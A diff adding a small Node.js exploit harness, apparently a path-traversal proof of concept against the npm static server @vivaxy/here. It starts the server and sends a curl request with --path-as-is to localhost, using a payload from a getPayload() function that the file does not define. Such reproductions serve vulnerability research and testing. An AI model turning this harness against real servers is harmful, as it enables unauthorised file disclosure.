@@ -1,0 +1,20 @@
+function exploitFunction() {
+  const { execSync } = require("child_process");
+  const path = require("path");
+
+  // Start the server
+  execSync("node ./node_modules/@vivaxy/here/index.js");
+
+  // Generate the payload
+  const payload = getPayload();
+
+  // Execute the attack string
+  const attack_string = `curl -v --path-as-is "http://127.0.0.1:3000${payload}"`;
+
+  // Execute the attack string and capture the output
+  const stdout = execSync(attack_string);
+
+  return stdout.toString();
+}
+
+module.exports = { exploitFunction };
